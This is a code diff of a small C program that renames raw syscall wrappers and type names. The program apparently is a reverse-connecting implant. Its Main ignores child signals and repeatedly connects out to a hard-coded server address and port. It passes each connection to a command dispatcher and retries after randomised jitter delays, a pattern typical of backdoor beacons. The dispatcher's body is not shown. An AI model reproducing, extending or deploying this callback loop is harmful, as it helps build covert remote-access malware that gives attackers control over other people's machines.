@@ -56,10 +56,10 @@ DEC_FUNC(ULONG) delay_jitter(ULONG *const seed, const ULONG base, const ULONG ma
 }
 
 DEC_FUNC(BOOLEAN) read_full(const LONG fd, BYTE *const buf, const LONG size)
-    BODY_IO_OP_(read)
+    BODY_IO_OP_(sys_read)
 
 DEC_FUNC(BOOLEAN) write_full(const LONG fd, CONST_PTR(BYTE) buf, const LONG size)
-    BODY_IO_OP_(write)
+    BODY_IO_OP_(sys_write)
 
 #undef BODY_IO_OP_
 
@@ -81,8 +81,8 @@ DEC_FUNC(VOID) loop_dispatcher(const LONG sockFd) {
 
 
 DEC_FUNC(BOOLEAN) ignore_sig(const LONG signum) {
-    const kernel_sigaction_t sa = {.sa_handler = SIG_IGN};
-    return SYSOK(rt_sigaction(signum, &sa, NULL, sizeof(sa.sa_mask)));
+    const kernel_sigaction sa = {.sa_handler = SIG_IGN};
+    return SYSOK(sys_rt_sigaction(signum, &sa, NULL, sizeof(sa.sa_mask)));
 }
 
 
@@ -100,10 +100,10 @@ VOID Main(VOID) {
     (VOID)ignore_sig(SIGCHLD);
 
     ULONG seedJitter = 0x243F6A8885A308D3UL; // Fractional part of Pi
-    getrandom(&seedJitter, sizeof(seedJitter));
+    sys_urandom(&seedJitter, sizeof(seedJitter));
 
     LONG sockFd;
-    const sockaddr_in_t sockHost = {
+    const sockaddr_in sockHost = {
         .sin_family = AF_INET,
         .sin_port   = htons(LB_SERVER_PORT),
         .sin_addr   = LB_SERVER_IPV4,
@@ -114,11 +114,11 @@ VOID Main(VOID) {
         const ULONG delayMs = delay_jitter(&seedJitter,
             SOCK_RETRY_DELAY, SOCK_RETRY_MASK);
 
-        if (SYSOK(sockFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))) {
-            if (SYSOK(connect(sockFd, &sockHost, sizeof(sockaddr_in_t))))
+        if (SYSOK(sockFd = sys_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))) {
+            if (SYSOK(sys_connect(sockFd, &sockHost, sizeof(sockaddr_in))))
                 loop_dispatcher(sockFd);
 
-            close(sockFd);
+            sys_close(sockFd);
         }
 
         sys_sleep_ms(delayMs);
